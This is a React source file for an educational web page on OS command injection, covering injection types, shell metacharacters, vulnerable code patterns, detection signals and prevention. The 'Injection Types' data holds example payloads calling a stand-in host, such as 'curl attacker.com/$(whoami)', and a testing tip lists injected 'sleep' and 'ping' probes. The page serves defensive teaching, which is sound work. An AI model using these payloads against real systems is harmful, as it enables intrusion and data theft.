import React from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  alpha,
  useTheme,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import TerminalIcon from "@mui/icons-material/Terminal";
import WarningIcon from "@mui/icons-material/Warning";
import CodeIcon from "@mui/icons-material/Code";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import { useNavigate } from "react-router-dom";

interface InjectionType {
  title: string;
  description: string;
  example: string;
  color: string;
}

const injectionTypes: InjectionType[] = [
  { title: "Direct Injection", description: "User input directly concatenated into command", example: "ping -c 4 {user_input}", color: "#ef4444" },
  { title: "Blind Injection", description: "No output returned, infer via timing or out-of-band", example: "sleep 10 || curl attacker.com", color: "#f59e0b" },
  { title: "Out-of-Band", description: "Exfiltrate data via DNS, HTTP to external server", example: "curl attacker.com/$(whoami)", color: "#8b5cf6" },
];

const shellMetacharacters = [
  { char: ";", use: "Command separator" },
  { char: "&&", use: "Execute if previous succeeds" },
  { char: "||", use: "Execute if previous fails" },
  { char: "|", use: "Pipe output to next command" },
  { char: "`cmd`", use: "Command substitution (backticks)" },
  { char: "$(cmd)", use: "Command substitution (modern)" },
  { char: ">", use: "Redirect output to file" },
  { char: "\\n", use: "Newline (URL: %0a)" },
];

const commonVulnPatterns = [
  "system(), exec(), shell_exec() with user input",
  "subprocess.call(shell=True) in Python",
  "Runtime.exec() in Java",
  "os.system() / os.popen() in Python",
  "backticks or system() in Ruby/Perl",
  "eval() with user-controlled strings",
];

const commonEntryPoints = [
  { title: "Network utilities", examples: "ping, traceroute, nslookup, curl" },
  { title: "File and backup tooling", examples: "tar, zip, rsync, mysqldump" },
  { title: "Media processing", examples: "ffmpeg, convert, exiftool" },
  { title: "DevOps automation", examples: "git, kubectl, docker, terraform" },
  { title: "Search and reporting", examples: "grep, find, awk, log processors" },
  { title: "Document rendering", examples: "wkhtmltopdf, pandoc, latex" },
];

const detectionSignals = [
  "Shell error messages or unexpected stderr output",
  "Time delays after injected sleeps or long pings",
  "Outbound DNS/HTTP callbacks to unusual domains",
  "Unexpected files created in temp or working dirs",
  "Child processes or command-line args containing user input",
];

const hardeningChecklist = [
  "Use exec/spawn with argument arrays and no shell parsing",
  "Pass -- before user input to prevent option injection",
  "Lock down PATH and environment variables",
  "Allowlist command names and arguments explicitly",
  "Run with minimal privileges and restricted filesystem access",
  "Log command execution with sanitized arguments",
];

const preventionMethods = [
  "Avoid shell commands entirely-use APIs/libraries",
  "Use parameterized commands (subprocess with list args)",
  "Strict input validation (whitelist allowed chars)",
  "Escape shell metacharacters properly",
  "Run with least privilege (drop root)",
  "Use sandboxing/containers for command execution",
];

export default function CommandInjectionPage() {
  const navigate = useNavigate();
  const theme = useTheme();

  const pageContext = `Command Injection & OS Command Execution Guide - Covers direct, blind, and out-of-band command injection techniques. Lists shell metacharacters, common entry points, detection signals, vulnerable code patterns, and prevention methods.`;

  return (
    <LearnPageLayout pageTitle="Command Injection" pageContext={pageContext}>
      <Container maxWidth="lg" sx={{ py: 4 }}>
        {/* Header */}
        <Box sx={{ mb: 4 }}>
          <Button startIcon={<ArrowBackIcon />} onClick={() => navigate("/learn")} sx={{ mb: 2 }}>
            Back to Learning Hub
          </Button>
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
            <Box
              sx={{
                width: 64,
                height: 64,
                borderRadius: 2,
                bgcolor: alpha("#ef4444", 0.1),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <TerminalIcon sx={{ fontSize: 36, color: "#ef4444" }} />
            </Box>
            <Box>
              <Typography variant="h4" sx={{ fontWeight: 800 }}>
                Command Injection
              </Typography>
              <Typography variant="body1" color="text.secondary">
                OS Command Execution Attacks
              </Typography>
            </Box>
          </Box>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="Web Security" color="error" size="small" />
            <Chip label="OWASP A03" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
            <Chip label="Critical" size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444" }} />
          </Box>
        </Box>

        {/* Overview */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> What is Command Injection?
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8 }}>
            Command injection occurs when an application passes unsafe user input to a system shell. Attackers 
            can inject shell metacharacters to execute arbitrary OS commands, potentially gaining full control 
            of the server. It's one of the most severe web vulnerabilities.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.8, mt: 2 }}>
            It frequently shows up in admin tools, diagnostic endpoints, and automation features that wrap OS utilities. 
            Even when the command itself is fixed, option injection can still alter behavior and expose sensitive data.
          </Typography>
        </Paper>

        {/* Injection Types */}
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>🎯 Injection Types</Typography>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {injectionTypes.map((type) => (
            <Grid item xs={12} md={4} key={type.title}>
              <Paper
                sx={{
                  p: 2,
                  height: "100%",
                  borderRadius: 2,
                  border: `1px solid ${alpha(type.color, 0.2)}`,
                  "&:hover": { borderColor: type.color },
                }}
              >
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: type.color, mb: 0.5 }}>
                  {type.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                  {type.description}
                </Typography>
                <Box sx={{ p: 1, bgcolor: alpha(type.color, 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                  {type.example}
                </Box>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Common Entry Points */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> Common Entry Points
          </Typography>
          <Grid container spacing={2}>
            {commonEntryPoints.map((entry) => (
              <Grid item xs={12} sm={6} md={4} key={entry.title}>
                <Box sx={{ p: 2, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.04), height: "100%" }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>
                    {entry.title}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    {entry.examples}
                  </Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Shell Metacharacters */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.05)}, ${alpha("#f59e0b", 0.05)})`,
            border: `1px solid ${alpha("#ef4444", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#ef4444" }} /> Shell Metacharacters
          </Typography>
          <Grid container spacing={1}>
            {shellMetacharacters.map((m) => (
              <Grid item xs={6} sm={3} key={m.char}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Chip label={m.char} size="small" sx={{ fontFamily: "monospace", fontWeight: 700, minWidth: 50 }} />
                  <Typography variant="caption" color="text.secondary">{m.use}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Detection Signals */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#f59e0b" }} /> Detection Signals
          </Typography>
          <List dense>
            {detectionSignals.map((signal, i) => (
              <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <WarningIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                </ListItemIcon>
                <ListItemText primary={signal} primaryTypographyProps={{ variant: "body2" }} />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Vulnerable Patterns & Prevention */}
        <Grid container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} /> Vulnerable Patterns
              </Typography>
              <List dense>
                {commonVulnPatterns.map((p, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#ef4444" }} />
                    </ListItemIcon>
                    <ListItemText primary={p} primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.8rem" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#10b981", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SecurityIcon sx={{ color: "#10b981" }} /> Prevention
              </Typography>
              <List dense>
                {preventionMethods.map((m, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                    </ListItemIcon>
                    <ListItemText primary={m} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        {/* Hardening Checklist */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#10b981", 0.05),
            border: `1px solid ${alpha("#10b981", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#10b981" }} /> Hardening Checklist
          </Typography>
          <List dense>
            {hardeningChecklist.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                </ListItemIcon>
                <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Tip */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 2,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
            display: "flex",
            alignItems: "center",
            gap: 2,
          }}
        >
          <TipsAndUpdatesIcon sx={{ color: "#f59e0b" }} />
          <Typography variant="body2">
            <strong>Testing Tip:</strong> Try <code>; sleep 10</code> or <code>| ping -c 10 127.0.0.1</code> to detect blind injection via time delays.
          </Typography>
        </Paper>

        {/* Related */}
        <Paper sx={{ p: 3, borderRadius: 3, bgcolor: alpha(theme.palette.primary.main, 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>📚 Related Learning</Typography>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="SQL Injection →" clickable onClick={() => navigate("/learn/sql-injection")} sx={{ fontWeight: 600 }} />
            <Chip label="SSRF Guide →" clickable onClick={() => navigate("/learn/ssrf")} sx={{ fontWeight: 600 }} />
            <Chip label="OWASP Top 10 →" clickable onClick={() => navigate("/learn/owasp")} sx={{ fontWeight: 600 }} />
          </Box>
        </Paper>
      </Container>
    </LearnPageLayout>
  );
}
